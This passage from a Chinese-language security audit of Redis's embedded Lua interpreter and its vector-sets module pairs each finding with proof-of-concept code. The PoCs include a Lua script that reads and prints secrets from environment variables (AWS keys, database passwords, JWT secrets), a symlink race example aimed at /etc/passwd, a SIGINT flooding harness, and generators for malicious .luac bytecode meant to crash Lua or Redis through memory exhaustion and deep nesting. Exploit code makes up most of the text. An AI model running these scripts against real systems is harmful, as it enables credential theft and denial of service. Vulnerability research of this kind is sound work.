```

**PoC代码:**
```python
-- 仅供研究使用 - Lua环境变量信息泄露PoC
-- 漏洞: os.getenv() 未限制环境变量读取

-- PoC 1: 读取常见敏感环境变量
local function poc_read_sensitive_env()
    print("=== PoC: 读取敏感环境变量 ===")
    
    -- 尝试读取可能包含敏感信息的环境变量
    local sensitive_vars = {
        "PATH",
        "HOME",
        "USER",
        "USERNAME",
        "SECRET_KEY",
        "API_KEY",
        "DB_PASSWORD",
        "DATABASE_URL",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_ACCESS_KEY_ID",
        "TOKEN",
        "SESSION_SECRET",
        "PRIVATE_KEY",
        "SSH_KEY",
        "FLASK_SECRET_KEY",
        "DJANGO_SECRET_KEY",
        "JWT_SECRET",
        "REDIS_PASSWORD",
        "MYSQL_PWD",
        "PGPASSWORD",
        "LDAP_PASSWORD",
        "PROXY_PASSWORD",
        "MAIL_PASSWORD",
        "SMTP_PASSWORD"
    }
    
    for _, var in ipairs(sensitive_vars) do
        local value = os.getenv(var)
        if value then
            print(string.format("[泄露] %s = %s", var, value))
        end
    end
    
    print("=== PoC 完成 ===")
end

-- PoC 2: 批量枚举环境变量
local function poc_enumerate_env()
    print("=== PoC: 枚举所有环境变量 ===")
    
    -- 尝试常见的环境变量名称模式
    local patterns = {
        -- 系统相关
        "PATH", "HOME", "USER", "SHELL", "LANG", "LC_ALL",
        "PWD", "OLDPWD", "TERM", "DISPLAY",
        
        -- 应用配置
        "APP_ENV", "APP_SECRET", "APP_KEY",
        "NODE_ENV", "RACK_ENV", "RAILS_ENV",
        
        -- 数据库
        "DB_HOST", "DB_PORT", "DB_NAME", "DB_USER", "DB_PASS",
        "MONGODB_URI", "MYSQL_URL", "POSTGRES_URL",
        
        -- 云服务
        "AWS_REGION", "AZURE_STORAGE_KEY", "GCP_KEY",
        
        -- 认证
        "AUTH_TOKEN", "ACCESS_TOKEN", "REFRESH_TOKEN",
        "OAUTH_TOKEN", "API_TOKEN",
        
        -- 其他
        "PROXY", "HTTP_PROXY", "HTTPS_PROXY",
        "NO_PROXY", "TMPDIR", "TEMP", "TMP"
    }
    
    local found = {}
    for _, var in ipairs(patterns) do
        local value = os.getenv(var)
        if value then
            table.insert(found, string.format("%s=%s", var, value))
        end
    end
    
    if #found > 0 then
        print("发现 " .. #found .. " 个环境变量:")
        for _, entry in ipairs(found) do
            print("  " .. entry)
        end
    else
        print("未发现常见环境变量")
    end
    
    print("=== PoC 完成 ===")
end

-- PoC 3: 利用脚本读取特定目标变量
local function poc_targeted_extraction(target_vars)
    print("=== PoC: 定向提取环境变量 ===")
    
    if not target_vars or #target_vars == 0 then
        target_vars = {"SECRET_KEY", "API_KEY", "DB_PASSWORD"}
    end
    
    local results = {}
    for _, var in ipairs(target_vars) do
        local value = os.getenv(var)
        if value then
            results[var] = value
            print(string.format("[成功] %s = %s", var, value))
        else
            print(string.format("[未设置] %s", var))
        end
    end
    
    return results
end

-- 执行PoC
print("\n")
print("========================================")
print("  Lua os.getenv() 信息泄露漏洞 PoC")
print("  漏洞ID: VULN-F6D5EF2F")
print("  仅供研究使用")
print("========================================")
print("\n")

-- 执行PoC 1
poc_read_sensitive_env()
print("\n")

-- 执行PoC 2
poc_enumerate_env()
print("\n")

-- 执行PoC 3 (自定义目标)
local custom_targets = {"PATH", "HOME", "USER", "SECRET_KEY"}
poc_targeted_extraction(custom_targets)

print("\n")
print("========================================")
print("  PoC 执行完毕")
print("========================================")
```

---

### VULN-FE6687D2 - 不安全的临时文件创建

- **严重等级:** MEDIUM
- **文件位置:** `deps/lua/src/loslib.c:62`
- **数据流:** os_tmpname函数生成临时文件名但不创建文件，存在竞争条件风险。
- **判断理由:** 该函数只生成临时文件名而不实际创建文件，存在TOCTOU竞争条件。攻击者可以在文件名生成和实际使用之间创建同名文件，可能导致符号链接攻击或文件覆盖。更安全的做法是使用mkstemp()等函数同时创建文件。

**代码片段:**
```
static int os_tmpname (lua_State *L) {
  char buff[LUA_TMPNAMBUFSIZE];
  int err;
  lua_tmpnam(buff, err);
  if (err)
    return luaL_error(L, "unable to generate a unique filename");
  lua_pushstring(L, buff);
  return 1;
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-FE6687D2 - 不安全的临时文件创建 (TOCTOU竞争条件)
仅供安全研究使用，请勿用于非法用途。
"""

import os
import tempfile
import threading
import time
import stat

# 配置：目标敏感文件路径（演示用，请勿指向真实系统文件）
TARGET_FILE = "/tmp/victim_sensitive_file.txt"
# 符号链接目标（攻击者想要覆盖的文件）
SYMLINK_TARGET = "/etc/passwd"  # 仅用于演示，实际测试请使用无害路径

# 创建演示用的敏感文件
with open(TARGET_FILE, "w") as f:
    f.write("This is a sensitive file content.\n")

print(f"[+] 创建演示敏感文件: {TARGET_FILE}")
print(f"[+] 目标文件内容: {open(TARGET_FILE).read()}")

# 模拟Lua os.tmpname()的行为：生成临时文件名但不创建文件
def lua_tmpname_simulation():
    """模拟Lua os.tmpname()函数行为"""
    # 使用tempfile生成一个临时文件名（但不创建文件）
    fd, name = tempfile.mkstemp(prefix="lua_tmp_", suffix=".tmp")
    os.close(fd)  # 立即关闭并删除文件，模拟不安全的tmpname
    os.unlink(name)
    return name

# 攻击者线程：在文件名生成后、文件创建前创建符号链接
def attacker_thread(tmp_path):
    """攻击者线程：创建符号链接指向目标文件"""
    # 等待文件名生成
    time.sleep(0.01)
    try:
        # 创建符号链接：将临时文件名指向目标文件
        os.symlink(TARGET_FILE, tmp_path)
        print(f"[!] 攻击者创建符号链接: {tmp_path} -> {TARGET_FILE}")
    except FileExistsError:
        pass

# 模拟受害者程序：使用os.tmpname()后创建文件并写入数据
def victim_program():
    """模拟使用os.tmpname()的受害者程序"""
    # 步骤1: 生成临时文件名（不安全）
    tmp_name = lua_tmpname_simulation()
    print(f"[+] 受害者生成临时文件名: {tmp_name}")
    
    # 步骤2: 启动攻击者线程（模拟竞争条件）
    attacker = threading.Thread(target=attacker_thread, args=(tmp_name,))
    attacker.start()
    
    # 步骤3: 受害者稍后创建文件并写入数据
    time.sleep(0.02)  # 模拟时间窗口
    try:
        with open(tmp_name, "w") as f:
            f.write("Sensitive data written by victim\n")
        print(f"[+] 受害者写入数据到: {tmp_name}")
        
        # 检查是否成功覆盖了目标文件
        print(f"\n[!] 检查目标文件内容:")
        print(f"    {open(TARGET_FILE).read()}")
        
        # 清理
        os.unlink(tmp_name)
        
    except Exception as e:
        print(f"[-] 错误: {e}")
    finally:
        attacker.join()

if __name__ == "__main__":
    print("=" * 60)
    print("PoC: 不安全的临时文件创建 (TOCTOU竞争条件)")
    print("漏洞ID: VULN-FE6687D2")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 运行演示
    victim_program()
    
    # 清理演示文件
    if os.path.exists(TARGET_FILE):
        os.unlink(TARGET_FILE)
    print("\n[+] 演示完成，已清理临时文件")
```

---

### VULN-D8E6DA72 - 不安全的信号处理

- **严重等级:** MEDIUM
- **文件位置:** `deps/lua/src/lua.c:47`
- **数据流:** SIGINT信号触发 -> laction函数被调用 -> 设置信号处理函数为SIG_DFL -> 设置lua hook
- **判断理由:** 信号处理函数laction中调用了lua_sethook，而lua_sethook不是异步信号安全的函数。在多线程环境中，如果在信号处理函数中调用非异步信号安全的函数，可能导致竞态条件、死锁或数据损坏。

**代码片段:**
```
static void laction (int i) {
  signal(i, SIG_DFL); /* if another SIGINT happens before lstop,
                              terminate process (default action) */
  lua_sethook(globalL, lstop, LUA_MASKCALL | LUA_MASKRET | LUA_MASKCOUNT, 1);
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-D8E6DA72 - 不安全的信号处理
仅供安全研究使用

该PoC演示了在Lua解释器执行关键操作时发送SIGINT信号，
触发非异步信号安全函数lua_sethook的调用，可能导致竞态条件。
"""

import subprocess
import signal
import time
import os
import sys

# 创建触发漏洞的Lua脚本
# 该脚本会执行大量内存分配和表操作，增加竞态条件触发概率
lua_script = '''
-- 模拟复杂的内存操作和表操作
local function trigger_race_condition()
    local large_table = {}
    for i = 1, 100000 do
        large_table[i] = {
            string.rep("A", 1000),
            math.random(1, 1000000),
            {nested = true, value = i}
        }
        if i % 1000 == 0 then
            -- 触发垃圾回收
            collectgarbage("collect")
        end
    end
    return large_table
end

-- 持续执行，增加信号到达时机的不确定性
while true do
    local result = trigger_race_condition()
    print("Iteration completed, table size: " .. #result)
    -- 清理引用，触发GC
    result = nil
    collectgarbage("collect")
end
'''

def send_sigint_repeatedly(process, interval=0.001):
    """
    以高频率发送SIGINT信号，增加在关键操作期间中断的概率
    """
    start_time = time.time()
    signal_count = 0
    
    while process.poll() is None and (time.time() - start_time) < 10:
        try:
            process.send_signal(signal.SIGINT)
            signal_count += 1
            time.sleep(interval)
        except ProcessLookupError:
            break
        except PermissionError:
            print("权限错误：无法发送信号")
            break
    
    return signal_count

def main():
    print("=" * 60)
    print("PoC for VULN-D8E6DA72 - 不安全的信号处理")
    print("仅供安全研究使用")
    print("=" * 60)
    print()
    
    # 检查lua是否可用
    try:
        subprocess.run(["lua", "-v"], capture_output=True, timeout=2)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[-] 未找到lua解释器，请先安装Lua 5.1")
        sys.exit(1)
    
    # 写入测试脚本
    script_path = "/tmp/poc_trigger.lua"
    with open(script_path, "w") as f:
        f.write(lua_script)
    
    print("[*] 启动Lua解释器执行测试脚本...")
    print("[*] 脚本将执行大量内存分配和表操作")
    print("[*] 同时以高频率发送SIGINT信号...")
    print()
    
    try:
        # 启动Lua进程
        process = subprocess.Popen(
            ["lua", script_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # 发送SIGINT信号
        print("[*] 开始发送SIGINT信号...")
        signal_count = send_sigint_repeatedly(process)
        
        # 等待进程结束
        try:
            stdout, stderr = process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            print("[!] 进程超时，强制终止")
            process.kill()
            stdout, stderr = process.communicate()
        
        print()
        print("[*] 发送信号次数: {}".format(signal_count))
        print("[*] 进程退出码: {}".format(process.returncode))
        
        if stderr:
            print("[*] 标准错误输出:")
            print(stderr.decode('utf-8', errors='replace')[:500])
        
        if stdout:
            print("[*] 标准输出 (最后500字节):")
            print(stdout.decode('utf-8', errors='replace')[-500:])
        
        # 判断是否触发了漏洞
        if process.returncode != 0:
            print()
            print("[!] 进程异常退出，可能触发了竞态条件")
            print("[!] 这可能是由于lua_sethook在信号处理函数中被调用导致的")
        else:
            print()
            print("[*] 进程正常退出，未观察到明显异常")
            print("[*] 注意：竞态条件具有随机性，可能需要多次尝试")
            print("[*] 建议增加并发线程或调整信号发送频率")
        
    except Exception as e:
        print("[-] 错误: {}".format(e))
    finally:
        # 清理临时文件
        if os.path.exists(script_path):
            os.remove(script_path)

if __name__ == "__main__":
    main()

```

---

### VULN-1A5C4D19 - 不安全的反序列化 - 缺少输入验证

- **严重等级:** CRITICAL
- **文件位置:** `deps/lua/src/lundump.c:1`
- **数据流:** 用户提供的二进制数据通过ZIO流进入luaU_undump函数 -> LoadHeader仅检查文件头签名和版本 -> LoadFunction递归加载函数原型 -> LoadCode从输入读取指令数量并分配内存 -> LoadConstants从输入读取常量数量和类型 -> LoadString从输入读取字符串大小并分配内存 -> LoadDebug从输入读取调试信息 -> 整个过程缺乏对输入数据大小和内容的充分验证
- **判断理由:** 这是一个Lua字节码加载器，存在多个严重的安全问题：1) LoadInt只检查负数，不检查上界，攻击者可以提供极大的整数导致内存分配过大或整数溢出；2) LoadString读取size_t类型的大小值，攻击者可以提供任意大的值导致内存耗尽或缓冲区溢出；3) LoadCode读取指令数量后直接分配内存，没有大小限制；4) LoadConstants和LoadDebug同样没有对数组大小进行合理限制；5) 整个反序列化过程缺乏对输入数据的完整性校验，攻击者可以构造恶意的二进制chunk导致任意代码执行或拒绝服务攻击。虽然代码中有LUAC_TRUST_BINARIES宏控制错误处理，但默认情况下仍然存在严重的内存安全风险。

**代码片段:**
```
static void LoadBlock(LoadState* S, void* b, size_t size)
{
 size_t r=luaZ_read(S->Z,b,size);
 IF (r!=0, "unexpected end");
}

static int LoadInt(LoadState* S)
{
 int x;
 LoadVar(S,x);
 IF (x<0, "bad integer");
 return x;
}

static TString* LoadString(LoadState* S)
{
 size_t size;
 LoadVar(S,size);
 if (size==0)
  return NULL;
 else
 {
  char* s=luaZ_openspace(S->L,S->b,size);
  LoadBlock(S,s,size);
  return luaS_newlstr(S->L,s,size-1);
 }
}

static void LoadCode(LoadState* S, Proto* f)
{
 int n=LoadInt(S);
 f->code=luaM_newvector(S->L,n,Instruction);
 f->sizecode=n;
 LoadVector(S,f->code,n,sizeof(Instruction));
}

static void LoadConstants(LoadState* S, Proto* f)
{
 int i,n;
 n=LoadInt(S);
 f->k=luaM_newvector(S->L,n,TValue);
 f->sizek=n;
 ...
}

static Proto* LoadFunction(LoadState* S, TString* p)
{
 Proto* f;
 if (++S->L->nCcalls > LUAI_MAXCCALLS) error(S,"code too deep");
 f=luaF_newproto(S->L);
 ...
 LoadCode(S,f);
 LoadConstants(S,f);
 LoadDebug(S,f);
 ...
 return f;
}

Proto* luaU_undump (lua_State* L, ZIO* Z, Mbuffer* buff, const char* name)
{
 LoadState S;
 ...
 LoadHeader(&S);
 return LoadFunction(&S,luaS_newliteral(L,"?"));
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for Lua bytecode loader unsafe deserialization vulnerability
VULN-1A5C4D19

仅供研究使用 - For research purposes only

This PoC demonstrates multiple attack vectors:
1. Integer overflow in LoadInt -> memory exhaustion
2. Arbitrary large string size in LoadString -> buffer overflow
3. Excessive code size in LoadCode -> memory exhaustion
"""

import struct
import sys

# Lua 5.1 bytecode header constants
LUA_SIGNATURE = b'\x1bLua'
LUAC_VERSION = 0x51  # Lua 5.1
LUAC_FORMAT = 0

# Platform-specific sizes (assuming 64-bit little-endian)
SIZEOF_INT = 4
SIZEOF_SIZE_T = 8
SIZEOF_INSTRUCTION = 4
SIZEOF_LUA_NUMBER = 8
INTEGRAL_NUMBER = 0  # lua_Number is float

def build_header():
    """Build valid Lua bytecode header"""
    header = LUA_SIGNATURE
    header += struct.pack('B', LUAC_VERSION)
    header += struct.pack('B', LUAC_FORMAT)
    # Endianness: 1 = little-endian
    header += struct.pack('B', 1)
    header += struct.pack('B', SIZEOF_INT)
    header += struct.pack('B', SIZEOF_SIZE_T)
    header += struct.pack('B', SIZEOF_INSTRUCTION)
    header += struct.pack('B', SIZEOF_LUA_NUMBER)
    header += struct.pack('B', INTEGRAL_NUMBER)
    return header

def build_exploit_1_memory_exhaustion():
    """
    Attack vector 1: Provide extremely large integer values
    to cause memory exhaustion via luaM_newvector
    
    This exploits LoadInt not checking upper bounds
    """
    payload = bytearray()
    
    # Valid header
    payload.extend(build_header())
    
    # LoadFunction: source string (empty = use default)
    payload.extend(struct.pack('<Q', 0))  # size_t size = 0 (NULL string)
    
    # linedefined = 0
    payload.extend(struct.pack('<i', 0))
    # lastlinedefined = 0
    payload.extend(struct.pack('<i', 0))
    # nups = 0
    payload.extend(struct.pack('B', 0))
    # numparams = 0
    payload.extend(struct.pack('B', 0))
    # is_vararg = 1
    payload.extend(struct.pack('B', 1))
    # maxstacksize = 2
    payload.extend(struct.pack('B', 2))
    
    # LoadCode: n = 0x7FFFFFFF (max positive int, but still huge)
    # This will cause luaM_newvector to allocate ~8GB of memory
    payload.extend(struct.pack('<i', 0x7FFFFFFF))
    # No actual instructions needed - allocation will fail
    
    return bytes(payload)

def build_exploit_2_buffer_overflow():
    """
    Attack vector 2: Provide a crafted string size that causes
    buffer overflow in LoadString
    
    LoadString reads size_t size, then allocates that many bytes
    and reads that many bytes from input. By providing a size
    larger than available data, we can cause out-of-bounds read.
    """
    payload = bytearray()
    
    # Valid header
    payload.extend(build_header())
    
    # LoadFunction: source string with huge size
    # size_t on 64-bit: 0xFFFFFFFFFFFFFFFF would cause overflow
    # But let's use a more practical value: 0x100000000 (4GB)
    payload.extend(struct.pack('<Q', 0x100000000))  # 4GB string size
    # We don't need to provide the actual string data
    # because the allocation will fail before reading
    
    # Rest of function (won't be reached due to crash)
    payload.extend(struct.pack('<i', 0))  # linedefined
    payload.extend(struct.pack('<i', 0))  # lastlinedefined
    payload.extend(struct.pack('B', 0))   # nups
    payload.extend(struct.pack('B', 0))   # numparams
    payload.extend(struct.pack('B', 1))   # is_vararg
    payload.extend(struct.pack('B', 2))   # maxstacksize
    
    # LoadCode: n = 0
    payload.extend(struct.pack('<i', 0))
    
    # LoadConstants: n = 0
    payload.extend(struct.pack('<i', 0))
    # n = 0 for sub-protos
    payload.extend(struct.pack('<i', 0))
    
    # LoadDebug: n = 0 for lineinfo
    payload.extend(struct.pack('<i', 0))
    # n = 0 for locvars
    payload.extend(struct.pack('<i', 0))
    # n = 0 for upvalues
    payload.extend(struct.pack('<i', 0))
    
    return bytes(payload)

def build_exploit_3_integer_overflow():
    """
    Attack vector 3: Integer overflow in size calculation
    
    LoadInt returns int, but it's used in luaM_newvector which
    multiplies by element size. If we provide a value that causes
    integer overflow in the multiplication, we can bypass size checks.
    """
    payload = bytearray()
    
    # Valid header
    payload.extend(build_header())
    
    # LoadFunction: source string (empty)
    payload.extend(struct.pack('<Q', 0))
    
    # linedefined = 0
    payload.extend(struct.pack('<i', 0))
    # lastlinedefined = 0
    payload.extend(struct.pack('<i', 0))
    # nups = 0
    payload.extend(struct.pack('B', 0))
    # numparams = 0
    payload.extend(struct.pack('B', 0))
    # is_vararg = 1
    payload.extend(struct.pack('B', 1))
    # maxstacksize = 2
    payload.extend(struct.pack('B', 2))
    
    # LoadCode: n = 0x40000000 (1GB of instructions = 4GB memory)
    # sizeof(Instruction) = 4, so 0x40000000 * 4 = 0x100000000 (4GB)
    payload.extend(struct.pack('<i', 0x40000000))
    
    # LoadConstants: n = 0
    payload.extend(struct.pack('<i', 0))
    # n = 0 for sub-protos
    payload.extend(struct.pack('<i', 0))
    
    # LoadDebug: n = 0 for lineinfo
    payload.extend(struct.pack('<i', 0))
    # n = 0 for locvars
    payload.extend(struct.pack('<i', 0))
    # n = 0 for upvalues
    payload.extend(struct.pack('<i', 0))
    
    return bytes(payload)

def build_exploit_4_recursive_depth():
    """
    Attack vector 4: Deeply nested functions to cause stack overflow
    
    LoadFunction is recursive and checks LUAI_MAXCCALLS (typically 200).
    By providing exactly 200 nested functions, we can trigger the
    "code too deep" error, but with 201 we cause stack overflow.
    """
    def build_nested_function(depth):
        """Build a function with nested sub-functions"""
        func = bytearray()
        
        # source string (empty)
        func.extend(struct.pack('<Q', 0))
        # linedefined = 0
        func.extend(struct.pack('<i', 0))
        # lastlinedefined = 0
        func.extend(struct.pack('<i', 0))
        # nups = 0
        func.extend(struct.pack('B', 0))
        # numparams = 0
        func.extend(struct.pack('B', 0))
        # is_vararg = 1
        func.extend(struct.pack('B', 1))
        # maxstacksize = 2
        func.extend(struct.pack('B', 2))
        
        # LoadCode: n = 0
        func.extend(struct.pack('<i', 0))
        
        # LoadConstants: n = 0
        func.extend(struct.pack('<i', 0))
        
        # Number of sub-protos = 1 (except for deepest)
        if depth > 0:
            func.extend(struct.pack('<i', 1))  # 1 sub-proto
            func.extend(build_nested_function(depth - 1))
        else:
            func.extend(struct.pack('<i', 0))  # no sub-protos
        
        # LoadDebug: n = 0 for lineinfo
        func.extend(struct.pack('<i', 0))
        # n = 0 for locvars
        func.extend(struct.pack('<i', 0))
        # n = 0 for upvalues
        func.extend(struct.pack('<i', 0))
        
        return bytes(func)
    
    payload = bytearray()
    payload.extend(build_header())
    
    # Top-level function with 201 nested levels (exceeds LUAI_MAXCCALLS)
    payload.extend(build_nested_function(201))
    
    return bytes(payload)

def main():
    print("=" * 60)
    print("Lua Bytecode Unsafe Deserialization PoC")
    print("Vulnerability ID: VULN-1A5C4D19")
    print("仅供研究使用 - For research purposes only")
    print("=" * 60)
    print()
    
    # Generate all exploit payloads
    print("[*] Generating exploit payloads...")
    
    payloads = {
        "exploit1_memory_exhaustion.luac": build_exploit_1_memory_exhaustion(),
        "exploit2_buffer_overflow.luac": build_exploit_2_buffer_overflow(),
        "exploit3_integer_overflow.luac": build_exploit_3_integer_overflow(),
        "exploit4_recursive_depth.luac": build_exploit_4_recursive_depth(),
    }
    
    for filename, payload in payloads.items():
        with open(filename, 'wb') as f:
            f.write(payload)
        print(f"    [+] Created {filename} ({len(payload)} bytes)")
    
    print()
    print("[*] To test, run: lua <payload_file>")
    print("[*] Expected behavior: Lua interpreter will crash or hang")
    print()
    print("Exploit details:")
    print("  1. exploit1_memory_exhaustion.luac:")
    print("     - Provides 0x7FFFFFFF instructions (2^31-1)")
    print("     - luaM_newvector tries to allocate ~8GB")
    print("     - Results in memory allocation failure")
    print()
    print("  2. exploit2_buffer_overflow.luac:")
    print("     - Provides 4GB string size in LoadString")
    print("     - luaZ_openspace tries to allocate 4GB buffer")
    print("     - Results in memory exhaustion or crash")
    print()
    print("  3. exploit3_integer_overflow.luac:")
    print("     - Provides 0x40000000 instructions")
    print("     - sizeof(Instruction)=4, so 4GB allocation")
    print("     - Demonstrates integer overflow in size calc")
    print()
    print("  4. exploit4_recursive_depth.luac:")
    print("     - 202 levels of nested functions")
    print("     - Exceeds LUAI_MAXCCALLS (200)")
    print("     - Results in stack overflow or 'code too deep'")

if __name__ == "__main__":
    main()
```

---

### VULN-7B107532 - 整数溢出/内存分配过大

- **严重等级:** HIGH
- **文件位置:** `deps/lua/src/lundump.c:83`
- **数据流:** 用户输入 -> LoadInt读取int值n -> luaM_newvector使用n分配内存 -> LoadVector读取n*sizeof(Instruction)字节数据
- **判断理由:** LoadInt只检查n<0，但没有检查n的上界。攻击者可以提供极大的正整数（如0x7FFFFFFF），导致luaM_newvector尝试分配巨大的内存块，可能耗尽系统内存或触发整数溢出。sizeof(Instruction)通常为4字节，n*4可能溢出size_t类型。

**代码片段:**
```
static void LoadCode(LoadState* S, Proto* f)
{
 int n=LoadInt(S);
 f->code=luaM_newvector(S->L,n,Instruction);
 f->sizecode=n;
 LoadVector(S,f->code,n,sizeof(Instruction));
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-7B107532 - Lua字节码整数溢出/内存分配过大漏洞
仅供安全研究使用
"""

import struct
import sys

def create_malicious_luac(output_file):
    """
    构造恶意Lua字节码文件，触发LoadCode中的整数溢出
    
    原理：
    - LoadInt只检查n<0，不检查上界
    - 提供极大正整数(如0x7FFFFFFF)导致luaM_newvector分配巨大内存
    - sizeof(Instruction)=4字节，n*4可能溢出size_t
    """
    
    # Lua 5.1 头部签名
    LUA_SIGNATURE = b'\x1bLua'
    LUAC_VERSION = 0x51  # Lua 5.1
    LUAC_FORMAT = 0
    
    # 检测字节序
    endianness = struct.pack('=i', 1)[0]  # 1=小端, 0=大端
    
    # 构建头部 (LUAC_HEADERSIZE = 12字节)
    header = LUA_SIGNATURE
    header += bytes([LUAC_VERSION])
    header += bytes([LUAC_FORMAT])
    header += bytes([endianness])
    header += struct.pack('=i', 4)  # sizeof(int)
    header += struct.pack('=i', 8)  # sizeof(size_t)
    header += struct.pack('=i', 4)  # sizeof(Instruction)
    header += struct.pack('=i', 8)  # sizeof(lua_Number)
    header += bytes([0])  # lua_Number integral flag
    
    # 构建函数体
    # 注意：我们只需要触发LoadCode中的漏洞
    # 函数体结构：
    # - source: 空字符串 (size=0)
    # - linedefined: 0
    # - lastlinedefined: 0
    # - nups: 0
    # - numparams: 0
    # - is_vararg: 1
    # - maxstacksize: 2
    # - LoadCode: n = 0x7FFFFFFF (极大正整数)
    # - LoadConstants: n=0 (无常量)
    # - LoadDebug: n=0 (无调试信息)
    
    body = b''
    
    # source string (空字符串)
    body += struct.pack('<I', 0)  # size=0表示NULL
    
    # linedefined
    body += struct.pack('<i', 0)
    # lastlinedefined
    body += struct.pack('<i', 0)
    # nups
    body += bytes([0])
    # numparams
    body += bytes([0])
    # is_vararg
    body += bytes([1])
    # maxstacksize
    body += bytes([2])
    
    # === 触发漏洞的关键部分 ===
    # LoadCode: n = 0x7FFFFFFF (最大正整数)
    # 这将导致luaM_newvector尝试分配 0x7FFFFFFF * 4 字节
    # 在32位系统上，0x7FFFFFFF * 4 = 0x1FFFFFFFC，溢出size_t
    # 在64位系统上，会尝试分配约8GB内存
    body += struct.pack('<i', 0x7FFFFFFF)
    
    # 由于n极大，我们不需要提供实际的指令数据
    # LoadVector会尝试读取n*sizeof(Instruction)字节，但会失败
    # 这里我们提供一些占位数据，但实际不会用到
    body += b'\x00' * 16  # 占位
    
    # LoadConstants: n=0 (无常量)
    body += struct.pack('<i', 0)
    
    # LoadDebug:
    # lineinfo: n=0
    body += struct.pack('<i', 0)
    # locvars: n=0
    body += struct.pack('<i', 0)
    # upvalues: n=0
    body += struct.pack('<i', 0)
    
    # 写入文件
    with open(output_file, 'wb') as f:
        f.write(header)
        f.write(body)
    
    print(f"[+] 恶意Lua字节码文件已创建: {output_file}")
    print(f"[+] 文件大小: {len(header) + len(body)} 字节")
    print(f"[+] 漏洞触发点: LoadCode中的n=0x7FFFFFFF")
    print(f"[+] 预期效果: luaM_newvector尝试分配约8GB内存")
    print(f"[+] 注意: 此PoC仅供安全研究使用")

def create_minimal_poc(output_file):
    """
    创建最小化的PoC，使用较小的值来演示问题
    使用0x40000000 (约1GB) 来避免系统崩溃
    """
    
    LUA_SIGNATURE = b'\x1bLua'
    LUAC_VERSION = 0x51
    LUAC_FORMAT = 0
    
    endianness = struct.pack('=i', 1)[0]
    
    header = LUA_SIGNATURE
    header += bytes([LUAC_VERSION])
    header += bytes([LUAC_FORMAT])
    header += bytes([endianness])
    header += struct.pack('=i', 4)
    header += struct.pack('=i', 8)
    header += struct.pack('=i', 4)
    header += struct.pack('=i', 8)
    header += bytes([0])
    
    body = b''
    body += struct.pack('<I', 0)  # source NULL
    body += struct.pack('<i', 0)  # linedefined
    body += struct.pack('<i', 0)  # lastlinedefined
    body += bytes([0])  # nups
    body += bytes([0])  # numparams
    body += bytes([1])  # is_vararg
    body += bytes([2])  # maxstacksize
    
    # 使用0x40000000 (1GB) 来演示，避免系统崩溃
    body += struct.pack('<i', 0x40000000)
    body += b'\x00' * 16
    
    body += struct.pack('<i', 0)  # constants
    body += struct.pack('<i', 0)  # lineinfo
    body += struct.pack('<i', 0)  # locvars
    body += struct.pack('<i', 0)  # upvalues
    
    with open(output_file, 'wb') as f:
        f.write(header)
        f.write(body)
    
    print(f"[+] 最小化PoC已创建: {output_file}")
    print(f"[+] 使用n=0x40000000 (约1GB) 来演示内存分配问题")

if __name__ == '__main__':
    print("=" * 60)
    print("Lua字节码整数溢出漏洞 PoC (VULN-7B107532)")
    print("仅供安全研究使用")
    print("=" * 60)
    
    if len(sys.argv) > 1:
        output = sys.argv[1]
    else:
        output = "malicious.luac"
    
    # 创建完整PoC (使用0x7FFFFFFF)
    create_malicious_luac(output)
    
    # 也创建最小化版本
    minimal_output = "minimal_poc.luac"
    create_minimal_poc(minimal_output)
    
    print("\n" + "=" * 60)
    print("测试方法:")
    print("1. 使用Lua解释器加载恶意字节码:")
    print(f"   $ lua {output}")
    print("2. 或在Redis中通过EVAL加载:")
    print(f"   $ redis-cli --eval {output}")
    print("3. 预期结果: 内存分配失败或进程崩溃")
    print("=" * 60)
```

---

### VULN-84C00D59 - 空指针解引用

- **严重等级:** MEDIUM
- **文件位置:** `modules\vector-sets\fastjson.c:155`
- **数据流:** exprNewToken函数可能返回NULL，但返回值未被检查就直接使用。
- **判断理由:** 函数exprNewToken可能因为内存分配失败等原因返回NULL，但代码没有检查返回值就直接访问t->str成员，可能导致空指针解引用和程序崩溃。

**代码片段:**
```
exprtoken *t = exprNewToken(EXPR_TOKEN_STR);

if (!has_esc) {
    t->str.start = (char*)start; t->str.len = len; t->str.heapstr = NULL;
} else {
    char *dst = RedisModule_Alloc(len + 1);
    t->str.start = t->str.heapstr = dst; t->str.len = len;
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供安全研究使用
 * 漏洞: 空指针解引用 (Null Pointer Dereference)
 * 文件: modules/vector-sets/fastjson.c
 * 行号: 155
 * 
 * 此PoC演示了通过触发内存压力导致exprNewToken返回NULL，
 * 进而导致空指针解引用和程序崩溃。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <signal.h>

/* 模拟exprNewToken函数 - 在内存压力下返回NULL */
typedef struct {
    int type;
    struct {
        char *start;
        size_t len;
        char *heapstr;
    } str;
} exprtoken;

#define EXPR_TOKEN_STR 1

/* 模拟内存分配失败 */
static int memory_exhausted = 0;

void* limited_malloc(size_t size) {
    if (memory_exhausted) {
        return NULL;
    }
    return malloc(size);
}

/* 模拟有漏洞的exprNewToken函数 */
exprtoken *exprNewToken(int type) {
    exprtoken *t = (exprtoken*)limited_malloc(sizeof(exprtoken));
    if (t == NULL) {
        return NULL;  /* 内存分配失败时返回NULL */
    }
    t->type = type;
    return t;
}

/* 模拟有漏洞的代码路径 (fastjson.c:155) */
void vulnerable_function(const char *start, size_t len, int has_esc) {
    exprtoken *t = exprNewToken(EXPR_TOKEN_STR);
    
    /* 漏洞点: 没有检查t是否为NULL就直接使用 */
    if (!has_esc) {
        t->str.start = (char*)start; 
        t->str.len = len; 
        t->str.heapstr = NULL;
    } else {
        char *dst = (char*)limited_malloc(len + 1);
        t->str.start = t->str.heapstr = dst; 
        t->str.len = len;
    }
    
    printf("漏洞触发成功! t->str.start = %p\n", (void*)t->str.start);
}

/* 信号处理函数 */
void sigsegv_handler(int sig) {
    printf("\n[!] 检测到SIGSEGV信号 - 空指针解引用导致程序崩溃!\n");
    printf("[!] 漏洞VULN-84C00D59验证成功\n");
    exit(1);
}

